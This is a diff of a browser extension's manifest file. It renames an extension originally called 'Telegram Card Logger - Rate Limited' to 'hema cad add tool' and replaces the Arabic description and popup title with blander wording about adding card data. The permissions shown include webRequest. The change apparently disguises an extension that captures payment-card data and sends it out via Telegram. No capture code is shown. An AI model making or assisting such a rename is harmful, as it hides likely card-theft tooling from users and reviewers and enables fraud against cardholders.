@@ -1,8 +1,8 @@
 {
   "manifest_version": 3,
-  "name": "Telegram Card Logger - Rate Limited",
+  "name": "hema cad add tool",
   "version": "2.0.0",
-  "description": "إكستنشن محسن مع نظام Rate Limiting - 10 رسائل لكل جهاز في الدقيقة",
+  "description": "أداة Hema لإضافة بيانات الكروت مع حماية وحدود إرسال.",
   
   "permissions": [
     "webRequest",
@@ -37,7 +37,7 @@
   
   "action": {
     "default_popup": "popup.html",
-    "default_title": "Telegram Card Logger",
+    "default_title": "hema cad add tool",
     "default_icon": {
       "16": "icon16.png",
       "48": "icon48.png",
